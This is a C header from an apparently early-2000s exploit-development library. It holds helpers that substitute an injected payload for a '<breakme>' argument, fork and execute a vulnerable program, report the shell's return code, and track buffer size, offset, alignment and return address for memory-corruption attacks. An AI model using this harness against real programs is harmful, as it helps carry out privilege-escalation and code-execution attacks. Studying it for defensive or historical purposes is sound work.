/*
 *  IOCExpLib.h - by IOC - www.ioc.fr.st
 *  Version: IOCExpLib v1.0a Beta - 06/03
 *  File name: IOCEL_MISC.h 
 *  Description: includes miscellaneous functions
 *  Contact me - Li0n7@voila.fr
 *
 */





#ifndef __IOCEL_MISC_H
#define __IOCEL_MISC_H
    






#include "IOCExpLib.h"






int IOCExpLib_myargc;
char *IOCExpLib_name, *IOCExpLib_payload, *IOCExpLib_myargv[64];

int IOCExpLib_bsize, IOCExpLib_offset, IOCExpLib_align;
unsigned long IOCExpLib_addr;

extern char **environ;










int
IOCExpLib_split(char cmd[256]) {

      int i;
      char buff[256];
      char *s;
      char *svptr;
      static const char delim[] = " \t\n";

      strncpy(buff, cmd, 256);

      s = strtok_r(buff, delim, &svptr);
      IOCExpLib_myargc = 0;

      while( s != 0 ) {
          IOCExpLib_myargv[IOCExpLib_myargc++] = s;
          s = strtok_r(NULL, delim, &svptr);
      }

      IOCExpLib_myargv[IOCExpLib_myargc] = 0;

      for(i= 0; i <= IOCExpLib_myargc; ++i)
          if(IOCExpLib_myargv[i] != 0){
              fprintf(stdout, "");
              if((strcmp(IOCExpLib_myargv[i], "<breakme>")) == 0) {
                  if(IOCExpLib_payload != NULL){
                      IOCExpLib_myargv[i] = (char *)malloc(strlen(IOCExpLib_payload)+1);
                      IOCExpLib_myargv[i] = IOCExpLib_payload;
                  }
              }
          }

      IOCExpLib_name = (char *)malloc(256);

      if (strstr(IOCExpLib_myargv[0], "./"))
          strncpy(IOCExpLib_name, (IOCExpLib_myargv[0]+2), 256);
      else
          strncpy(IOCExpLib_name, IOCExpLib_myargv[0], 256);

      return 0;
}











static void
IOCExpLib_exec_vuln(void) {
      execve(IOCExpLib_name, IOCExpLib_myargv, environ);
      fprintf(stderr, "%s: execve()\n", strerror(errno));

}










int
IOCExpLib_tease()
{
      pid_t pid;
      pid_t wpid;
      int status;

      pid = fork();

      if ( pid == -1 ) {
          #ifdef VERBOSE
              fprintf(stderr, " [-] %s: Failed to fork()\n", strerror(errno));
          #endif
          exit(13);

      } else if ( pid == 0 ) {

          IOCExpLib_exec_vuln();

      } else  {

         wpid = wait(&status);   /* Child's exit status */
         if ( wpid == -1 ) {

             #ifdef VERBOSE
                 fprintf(stderr,"[-] %s: wait()\n", strerror(errno));
             #endif
             return 1;

         } else if ( wpid != pid )

             abort();

        else {

            if ( WIFEXITED(status) ) {

                #ifdef VERBOSE
                    printf("[+] Exited: shell's ret code = %d\n", WEXITSTATUS(status));
                #endif
                return WEXITSTATUS(status);

            } else if ( WIFSIGNALED(status) ) {

                return WTERMSIG(status);
            } else {

                #ifdef VERBOSE
                    fprintf(stderr, "[-] Stopped.\n");
                #endif

            }
        }
      }
      return 1;
}








long
IOCExpLib_diff(char *progname, char *section1, char *section2)
{
      unsigned long addr1, addr2;
      long diff;

      addr1 = IOCExpLib_get_section(progname, section1);
      addr2 = IOCExpLib_get_section(progname, section2);

      diff = addr1 - addr2;

      #ifdef VERBOSE
          fprintf(stdout, "[+] 0x%x (%u) - 0x%x (%u) = 0x%x (%u)\n", addr1, addr1, addr2, addr2, diff, diff);
      #endif

      return diff;
}







int
IOCExpLib_return_bsize(void)
{
      return IOCExpLib_bsize;
}




int
IOCExpLib_return_offset(void)
{
      return IOCExpLib_offset;
}




int
IOCExpLib_return_align(void)
{
      return IOCExpLib_align;
}




unsigned long
IOCExpLib_return_retaddr(void)
{
      return IOCExpLib_addr;
}



#endif





